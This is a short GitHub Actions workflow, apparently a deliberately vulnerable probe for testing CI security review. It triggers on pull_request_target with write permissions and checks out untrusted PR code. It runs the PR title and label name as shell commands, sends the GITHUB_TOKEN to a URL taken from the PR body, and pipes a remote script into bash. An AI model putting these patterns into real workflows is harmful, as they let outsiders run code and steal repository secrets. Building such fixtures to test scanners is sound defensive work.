name: DCOIR Review v16 Coverage Probe
on:
  pull_request_target:
permissions:
  contents: write
  pull-requests: write
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.head_ref }}
      - name: PR title shell
        run: |
          bash -c "${{ github.event.pull_request.title }}"
      - name: Token to PR body URL
        run: |
          wget --header="Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" -O- "${{ github.event.pull_request.body }}"
      - name: Network installer
        run: |
          wget -qO- https://downloads.example.invalid/bootstrap.sh | bash
      - name: Label shell
        run: |
          sh -c "${{ github.event.pull_request.labels[0].name }}"
